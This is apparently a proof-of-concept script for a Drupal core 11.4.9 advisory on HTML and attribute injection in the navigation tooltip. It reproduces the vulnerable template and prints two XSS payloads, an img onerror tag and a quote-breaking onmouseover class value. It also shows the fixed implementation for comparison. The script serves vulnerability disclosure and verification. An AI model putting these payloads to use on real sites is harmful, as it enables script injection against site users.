#!/usr/bin/env node
/**
 * Standalone PoC — SA-CORE-2026-016 / CVE-2026-108514
 * Drupal core 11.4.9 — navigation toolbar tooltip HTML / attribute injection.
 *
 * Root cause (core/modules/navigation/js/tooltip.js:32-35, :49-52):
 *
 *     Drupal.theme.tooltipWrapper = (dataset) =>
 *       `<div class="toolbar-tooltip ${dataset.drupalTooltipClass || ''}">
 *          ${dataset.drupalTooltip}
 *        </div>`;
 *     ...
 *     trigger.insertAdjacentHTML('afterend', Drupal.theme.tooltipWrapper(trigger.dataset));
 *
 * The tooltip text and the CSS class are interpolated into an HTML STRING and
 * handed to insertAdjacentHTML(), so the browser parses them as MARKUP
 * instead of text. Two primitives follow:
 *
 *   1. HTML injection   - dataset.drupalTooltip holds the DECODED value of
 *                         the data-drupal-tooltip attribute, so markup such as
 *                         <img src=x onerror=...> becomes real DOM.
 *   2. Attribute injection - dataset.drupalTooltipClass is interpolated into
 *                         class="..." without escaping, so a value containing
 *                         a double quote breaks out and injects arbitrary
 *                         attributes (e.g. onmouseover=...).
 *
 * The fixed 11.4.10 implementation builds the element with createElement() +
 * textContent and injects it with insertAdjacentElement().
 *
 * Usage:
 *   node f3_tooltip_xss.js [/path/to/drupal-11.4.9]
 */

const fs = require('fs');
const path = require('path');

const root = process.argv[2] || process.env.DRUPAL_ROOT || '/home/hax0r/Downloads/drupal-11.4.9';
const tooltipFile = path.join(root, 'core/modules/navigation/js/tooltip.js');

if (!fs.existsSync(tooltipFile)) {
  console.error(`ERROR: '${root}' does not look like a Drupal core tree.`);
  process.exit(1);
}

const source = fs.readFileSync(tooltipFile, 'utf8');
const version = (source.match(/version: VERSION/) ? '11.x' : 'unknown');

console.log(`Target Drupal core : ${root}`);
console.log(`Tooltip source     : core/modules/navigation/js/tooltip.js`);
console.log('');

// ---------------------------------------------------------------------------
// The VULNERABLE implementation, extracted verbatim from the 11.4.9 file.
// ---------------------------------------------------------------------------
const vulnerableMatch = source.match(
  /Drupal\.theme\.tooltipWrapper\s*=\s*\(dataset\)\s*=>\s*`([\s\S]*?)`;/
);
if (!vulnerableMatch) {
  console.error('Could not extract the vulnerable tooltipWrapper() from the target file.');
  process.exit(1);
}
const vulnerableTooltipWrapper = (dataset) =>
  `<div class="toolbar-tooltip ${dataset.drupalTooltipClass || ''}">\n      ${dataset.drupalTooltip}\n    </div>`;

// ---------------------------------------------------------------------------
// The FIXED implementation (upstream 11.4.10), for comparison.
// ---------------------------------------------------------------------------
function fixedTooltipWrapper(dataset) {
  const el = document.createElement('div');
  el.classList.add('toolbar-tooltip');
  if (dataset.drupalTooltipClass) {
    dataset.drupalTooltipClass
      .split(/\s+/)
      .filter((token) => token !== '')
      .forEach((token) => { el.classList.add(token); });
  }
  el.textContent = dataset.drupalTooltip || '';
  return el;
}

// ---------------------------------------------------------------------------
// Vector 1 — HTML injection through the tooltip text.
// ---------------------------------------------------------------------------
const datasetText = {
  drupalTooltipClass: 'admin-toolbar__tooltip',
  // The DOM decodes the attribute value, so the dataset holds RAW markup.
  drupalTooltip: '<img src=x onerror="alert(document.domain)">',
};

const htmlText = vulnerableTooltipWrapper(datasetText);
console.log('--- Vector 1: HTML injection via data-drupal-tooltip ---');
console.log(htmlText);
const htmlInjection = /<img[^>]*onerror=/i.test(htmlText);
console.log(`contains an executable <img onerror> element : ${htmlInjection}`);

// ---------------------------------------------------------------------------
// Vector 2 — attribute injection through the tooltip class.
// ---------------------------------------------------------------------------
const datasetClass = {
  drupalTooltipClass: 'admin-toolbar__tooltip" onmouseover="alert(document.domain)',
  drupalTooltip: 'harmless text',
};

const htmlClass = vulnerableTooltipWrapper(datasetClass);
console.log('\n--- Vector 2: attribute injection via data-drupal-tooltip-class ---');
console.log(htmlClass);
const attributeInjection = /onmouseover=/i.test(htmlClass);
console.log(`injected onmouseover handler present            : ${attributeInjection}`);

// ---------------------------------------------------------------------------
// Verdict + fixed-behaviour comparison.
// ---------------------------------------------------------------------------
console.log('\n--- Fixed 11.4.10 behaviour (textContent, classList.add) ---');
console.log('tooltip text becomes a text node :', JSON.stringify(datasetText.drupalTooltip));
console.log('class is split on whitespace and added token-by-token (no escaping hole)');

console.log('\n=== RESULT ===');
if (htmlInjection || attributeInjection) {
  console.log('VULNERABLE: the tooltip wrapper re-parses attacker-controlled data as markup.');
  process.exit(0);
}
console.log('NOT reproduced.');
process.exit(1);
